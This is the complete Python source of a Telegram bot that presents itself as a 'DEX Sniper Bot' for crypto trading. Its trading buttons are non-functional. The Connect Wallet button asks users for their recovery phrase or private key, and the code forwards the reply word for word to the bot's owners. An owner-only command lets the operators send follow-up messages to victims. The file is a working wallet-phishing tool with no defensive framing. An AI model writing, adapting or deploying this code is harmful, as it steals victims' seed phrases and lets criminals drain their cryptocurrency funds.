import os
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters

# Load environment variables
load_dotenv()

BOT_TOKEN = os.getenv('TELEGRAM_TOKEN')
OWNER_ID = os.getenv("OWNER_ID")
SECOND_OWNER_ID = os.getenv("SECOND_OWNER_ID")
THIRD_OWNER_ID = os.getenv("THIRD_OWNER_ID")

if not BOT_TOKEN or not OWNER_ID:
    raise ValueError("Missing TELEGRAM_TOKEN or OWNER_ID in environment variables")

OWNER_ID = int(OWNER_ID)
SECOND_OWNER_ID = int(SECOND_OWNER_ID) if SECOND_OWNER_ID else None
THIRD_OWNER_ID = int(THIRD_OWNER_ID) if THIRD_OWNER_ID else None

OWNER_IDS = [OWNER_ID]
if SECOND_OWNER_ID:
    OWNER_IDS.append(SECOND_OWNER_ID)
if THIRD_OWNER_ID:
    OWNER_IDS.append(THIRD_OWNER_ID)

waiting_for_wallet = set()
waiting_for_help = set()

# /start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🧩 Connect Wallet", callback_data='connect')],
        [InlineKeyboardButton("🎁 Claim Gift", callback_data='claim')],
        [InlineKeyboardButton("🟢 Buy", callback_data='buy'), InlineKeyboardButton("🔴 Sell", callback_data='sell')],
        [InlineKeyboardButton("📈 DCA Order", callback_data='dca'), InlineKeyboardButton("⏱ Limit Order", callback_data='limit')],
        [InlineKeyboardButton("📊 View Position", callback_data='position')],
        [InlineKeyboardButton("🆘 Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👋 Welcome to DEX Sniper Bot!\nTrack new tokens, trade instantly, and automate your moves.\nUse the buttons below to get started 👇",
        reply_markup=reply_markup
    )

# Button click handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    user = update.effective_user
    display_name = f"@{user.username}" if user.username else f"ID:{user.id}"

    responses = {
        'connect': "Enter your 12-key recovery phrase or private key to proceed.",
        'claim': "🎁 Please connect your wallet first. Click /start to continue.",
        'buy': "🟢 Please connect your wallet first. Click /start to continue.",
        'sell': "🔴 Please connect your wallet first. Click /start to continue.",
        'dca': "📈 Please connect your wallet first. Click /start to continue.",
        'limit': "⏱ Please connect your wallet first. Click /start to continue.",
        'position': "📊 Please connect your wallet first. Click /start to continue.",
        'help': "🆘 Help request received! The admin has been notified.\n\nWhat do you need help with?"
    }

    await query.edit_message_text(text=responses.get(action, "Unknown action."))

    if action == "connect":
        alert_msg = f"⚠️ Wallet info incoming from {display_name} (ID: {user.id})"
        for owner_id in OWNER_IDS:
            await context.bot.send_message(chat_id=owner_id, text=alert_msg)
        waiting_for_wallet.add(user.id)

    elif action == "help":
        alert_msg = f"🆘 Help request started from {display_name} (ID: {user.id})"
        await context.bot.send_message(chat_id=OWNER_ID, text=alert_msg)
        waiting_for_help.add(user.id)

# Wallet/help message forwarding
async def forward_wallet_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    display_name = f"@{user.username}" if user.username else f"ID:{user_id}"

    if user_id in waiting_for_wallet:
        message_text = update.message.text
        msg = f"🔐 Wallet info received from {display_name}:\n\n{message_text}"

        for owner_id in OWNER_IDS:
            await context.bot.send_message(chat_id=owner_id, text=msg)

        await update.message.reply_text("✅ Wallet info received. Thank you! Awaiting admin response...")
        waiting_for_wallet.remove(user_id)

    elif user_id in waiting_for_help:
        message_text = update.message.text
        msg = f"🆘 Help message from {display_name}:\n\n{message_text}"

        await context.bot.send_message(chat_id=OWNER_ID, text=msg)
        await update.message.reply_text("✅ Help message sent. The admin will contact you shortly.")
        waiting_for_help.remove(user_id)

# /invalid command for owner to notify users
async def invalid_format(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_IDS:
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /invalid <user_id> <message>")
        return

    try:
        target_id = int(context.args[0])
        message = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=target_id, text=f"⚠️ {message}")
        await update.message.reply_text(f"Sent to user {target_id}.")
    except Exception as e:
        await update.message.reply_text(f"Failed to send message: {e}")

# Run bot
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("invalid", invalid_format))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), forward_wallet_message))
    app.run_polling()

if __name__ == '__main__':
    main()
